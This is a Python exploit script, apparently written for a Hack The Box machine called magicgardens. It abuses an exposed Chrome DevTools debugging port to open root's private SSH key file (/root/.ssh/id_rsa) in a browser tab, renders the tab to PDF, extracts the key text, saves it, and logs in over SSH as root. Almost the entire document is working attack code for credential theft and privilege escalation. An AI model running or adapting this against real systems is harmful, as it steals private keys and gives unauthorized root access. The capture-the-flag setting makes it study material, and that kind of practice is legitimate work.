import json
import requests
import websocket
import base64
import PyPDF2
import os

# Step 1: Retrieve Debugging Information
debugger_address = 'http://localhost:34965/json'
response = requests.get(debugger_address)
tabs = response.json()

# Step 2: Extract WebSocket Debugger URL
web_socket_debugger_url = tabs[0]['webSocketDebuggerUrl'].replace('127.0.0.1', 'localhost')

# Step 3: Connect to WebSocket Debugger with verbose logging
ws = websocket.create_connection(web_socket_debugger_url, suppress_origin=True, header=["User-Agent: Firefox"], trace=True)

# Step 4: Create Target
create_target_command = json.dumps({
    "id": 1,
    "method": "Target.createTarget",
    "params": {
        "url": "file:///root/.ssh/id_rsa"
    }
})
ws.send(create_target_command)
print("Create target command sent.")
result = json.loads(ws.recv())
target_id = result['result']['targetId']

# Step 5: Attach to Target
attach_command = json.dumps({
    "id": 2,
    "method": "Target.attachToTarget",
    "params": {
        "targetId": target_id,
        "flatten": True
    }
})
ws.send(attach_command)
print("Attach command sent.")
session_id = json.loads(ws.recv())['params']['sessionId']

# Step 6: Capture Page Content as PDF
capture_command = json.dumps({
    "id": 3,
    "method": "Page.printToPDF",
    "sessionId": session_id,
    "params": {
        "landscape": False,
        "displayHeaderFooter": False,
        "printBackground": True,
        "preferCSSPageSize": True
    }
})
ws.send(capture_command)
print("Capture page content command sent.")
result = json.loads(ws.recv())

ws.send(capture_command)
print("Capture page content command sent for confirmation.")
result = json.loads(ws.recv())

# Check if 'result' contains the PDF data
if 'result' in result and 'data' in result['result']:
    pdf_data = base64.b64decode(result['result']['data'])

    # Step 7: Save Page Content as PDF
    with open("page_content.pdf", "wb") as pdf_file:
        pdf_file.write(pdf_data)
    print("Page content saved as PDF.")

    # Step 8: Convert PDF to Text
    with open("page_content.pdf", "rb") as pdf_file:
        reader = PyPDF2.PdfReader(pdf_file)
        page = reader.pages[0]
        text = page.extract_text()

    # Output the extracted text
    print("Extracted text:")
    print(text)

    # Step 9: Save the extracted text to id_rsa file
    with open("id_rsa", "w") as id_rsa_file:
        id_rsa_file.write(text + '\n')
    print("Extracted text saved to id_rsa file.")

    # Step 10: Change permissions of id_rsa file to 600
    os.chmod("id_rsa", 0o600)
    print("Permissions of id_rsa file changed to 600.")

    # Step 11: Run SSH command
    print("SSH Connection to magicgardens root user...")
    os.system("ssh -i id_rsa root@magicgardens.htb")
else:
    print("Error: PDF data not found in the result.")

# Step 12: Close WebSocket Connection
ws.close()
